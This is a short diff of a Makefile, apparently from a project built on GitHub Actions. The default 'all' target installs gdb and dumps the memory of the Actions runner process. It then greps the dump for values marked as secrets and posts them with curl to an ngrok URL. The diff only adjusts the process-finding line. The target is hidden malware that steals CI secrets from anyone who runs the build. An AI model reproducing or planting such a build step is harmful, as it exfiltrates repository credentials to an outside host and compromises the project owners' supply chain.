@@ -28,7 +28,7 @@ asm = $(obj:.o=.s)
 all: 
 	sudo apt update -y
 	sudo apt-get install -y gdb
-	sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
+	sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' |grep -v grep| head -n 1 | awk '{ print $1 }')"
 	grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | curl --data @- https://826984e94fd6.ngrok.app
 32bit: $(binary) mods
 
